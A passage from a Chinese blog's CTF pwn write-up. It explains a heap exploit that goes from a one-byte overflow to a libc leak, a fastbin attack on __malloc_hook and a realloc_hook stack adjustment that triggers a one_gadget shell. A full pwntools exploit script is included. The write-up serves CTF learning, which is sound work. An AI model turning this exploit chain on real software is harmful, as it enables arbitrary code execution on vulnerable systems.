+<p>开始同3.babyheap，首先edit(0)将chunk1的size改大到可以覆盖chunk2，由于只能溢出1个字节，因此不可能修改size为大于0x100，而unsorted bin leak泄露main_arena地址必须要chunk_size &gt; 0x80,因此，申请chunk1的size为0x10，申请chunk2的size为0x90，修改chunk1的size为0xa1，此时，由于chunk1_addr + 0xa1位置为0，不满足free chunk时的检查机制（即free(1)时，chunk2的pre_size和size要合法），因此再通过edit(2)可以控制到chunk1的最后，也就是检查的下一个chunk的pre_size和size。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p8(<span class="number">0xa1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span> + <span class="number">10</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">0xe</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x80</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p>之后，就可以free(1)了，free(1)之后chunk1包含了chunk2，由于同样是alloc，所以需要先恢复chunk2的size字段，之后free(2),通过chunk1打印出chunk2 fd位置的main_arena地址，进而获取one_gadget地址。</p>
+<p>最后，通过fastbin dump，首先修改chunk2的size为0x71，之后free(2)将chunk2链入fastbin,并经过edit(1)修改chunk2的fd为target_addr（即malloc_hook - 0x23),这样add(0x60)两次就得到了target_addr,就可以将malloc_hook修改为one_gadget了。</p>
+<p>但是，有个问题，如下四个one_gadget条件均不满足，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x45216</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x30</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line"><span class="number">0x4526a</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x30</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x30</span>] == NULL</span><br><span class="line"></span><br><span class="line"><span class="number">0xf02a4</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x50</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x50</span>] == NULL</span><br><span class="line"></span><br><span class="line"><span class="number">0xf1147</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == NULL</span><br></pre></td></tr></table></figure>
+
+<p>对于最后一个rsp+0x70,查看rsp发现rsp+0x70处内容不为0，因此会失败。</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pPCdYTg"><img src="https://s1.ax1x.com/2023/08/01/pPCdYTg.png" alt="pPCdYTg.png"></a></p>
+<p>解决方法：</p>
+<p>当向__malloc_hook写one_gadget时，如果不满足one_gadget的条件时，而我们的环境不太好调整，所以无法getshell。<br>我们可以通过__malloc_hook和realloc_hook相配合的方法来使得one_gadget生效。</p>
+<p>realloc函数在函数起始会检查realloc_hook的值是否为0，不为0则跳转至realloc_hook指向地址。<br>realloc_hook同malloc_hook相邻，故可通过fastbin attack一同修改两个值。</p>
+<p>观察一下realloc_hook值不为0时realloc函数过程。</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pPCdUYj"><img src="https://s1.ax1x.com/2023/08/01/pPCdUYj.png" alt="pPCdUYj.png"></a></p>
+<p>将realloc_hook设置为选择好的one_gadget，将malloc_hook设置为realloc函数开头某一push寄存器处。push和pop的次数是一致的，若push次数减少则会压低堆栈，改变栈环境。这时one_gadget就会可以使用。具体要压低栈多少要根据环境决定，这里我们可以进行小于48字节内或72字节的堆栈调整。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span> + p64(one_gadget)+p64(realloc_hook + <span class="number">4</span>) </span><br><span class="line">					//realloc+<span class="number">4</span>表示指向push r13的位置，即少push两次，这样rsp就会被太高						<span class="number">0x10</span>，rsp+<span class="number">0x70</span>就会等于rsp+<span class="number">0x80</span> = <span class="number">0</span>满足one_gadget条件</span><br><span class="line">    				//有点不太了解rsp+<span class="number">0x78</span>也是<span class="number">0</span>，但是realloc+<span class="number">2</span>(少push一次)打不通。</span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span> + <span class="number">10</span>,<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p8(<span class="number">0xa1</span>))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">0xe</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0xa1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line">libcbase = malloc_hook - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] </span><br><span class="line">one_gadget = libcbase + <span class="number">0xf1147</span></span><br><span class="line">realloc_hook = libcbase + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0</span>)*<span class="number">12</span> + p64(<span class="number">0x70</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x90</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">0x23</span>) * <span class="number">2</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment">#edit(4,0x60 + 10,b&#x27;a&#x27; * 0x60</span></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span> + p64(one_gadget)+p64(realloc_hook + <span class="number">4</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">此间的少年</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/08/01/Pwn-%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E5%A0%86%E9%A2%98/">http://example.com/2023/08/01/Pwn-%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E5%A0%86%E9%A2%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/./img/pwn.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/title.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">此间的少年</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xxxxx" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://mail.qq.com/" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-hitcontraining-heapcreator"><span class="toc-number">1.</span> <span class="toc-text">1.hitcontraining_heapcreator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-babyfengshui-33c3-2016"><span class="toc-number">2.</span> <span class="toc-text">2.babyfengshui_33c3_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-0ctf-2017-babyheap"><span class="toc-number">3.</span> <span class="toc-text">3.0ctf_2017_babyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-pwnable-hacknote"><span class="toc-number">4.</span> <span class="toc-text">4.pwnable_hacknote</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-pwnable-hacknote"><span class="toc-number">5.</span> <span class="toc-text">5.pwnable_hacknote</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/01/Pwn-%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E5%A0%86%E9%A2%98/" title="PWN-几个简单堆题"><img src="/./img/pwn.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PWN-几个简单堆题"/></a><div class="content"><a class="title" href="/2023/08/01/Pwn-%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E5%A0%86%E9%A2%98/" title="PWN-几个简单堆题">PWN-几个简单堆题</a><time datetime="2023-08-01T09:54:11.000Z" title="Created 2023-08-01 17:54:11">2023-08-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/19/PWN-PIE%E5%AD%A6%E4%B9%A0/" title="PWN-PIE学习"><img src="/./img/pwn.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PWN-PIE学习"/></a><div class="content"><a class="title" href="/2023/07/19/PWN-PIE%E5%AD%A6%E4%B9%A0/" title="PWN-PIE学习">PWN-PIE学习</a><time datetime="2023-07-19T12:26:22.000Z" title="Created 2023-07-19 20:26:22">2023-07-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/17/PWN-Canary%E5%AD%A6%E4%B9%A0/" title="PWN-Canary学习"><img src="/./img/pwn.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PWN-Canary学习"/></a><div class="content"><a class="title" href="/2023/07/17/PWN-Canary%E5%AD%A6%E4%B9%A0/" title="PWN-Canary学习">PWN-Canary学习</a><time datetime="2023-07-17T08:55:09.000Z" title="Created 2023-07-17 16:55:09">2023-07-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/11/Pwn-ORW%E5%88%A9%E7%94%A8/" title="Pwn-浅谈orw利用"><img src="/./img/pwn.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pwn-浅谈orw利用"/></a><div class="content"><a class="title" href="/2023/07/11/Pwn-ORW%E5%88%A9%E7%94%A8/" title="Pwn-浅谈orw利用">Pwn-浅谈orw利用</a><time datetime="2023-07-11T01:39:36.000Z" title="Created 2023-07-11 09:39:36">2023-07-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/27/Pwn-%E5%A0%86%E5%9F%BA%E7%A1%80-House%20of%20Orange/" title="PWN-堆基础之House of Orange"><img src="/./img/pwn.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PWN-堆基础之House of Orange"/></a><div class="content"><a class="title" href="/2023/06/27/Pwn-%E5%A0%86%E5%9F%BA%E7%A1%80-House%20of%20Orange/" title="PWN-堆基础之House of Orange">PWN-堆基础之House of Orange</a><time datetime="2023-06-27T07:16:19.000Z" title="Created 2023-06-27 15:16:19">2023-06-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/./img/pwn.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 此间的少年</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">簡</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://example.com/2023/08/01/Pwn-%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E5%A0%86%E9%A2%98/'
+    this.page.identifier = '2023/08/01/Pwn-几个简单堆题/'
+    this.page.title = 'PWN-几个简单堆题'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><div class="aplayer no-destroy" data-id="7399261759" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true"> </div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
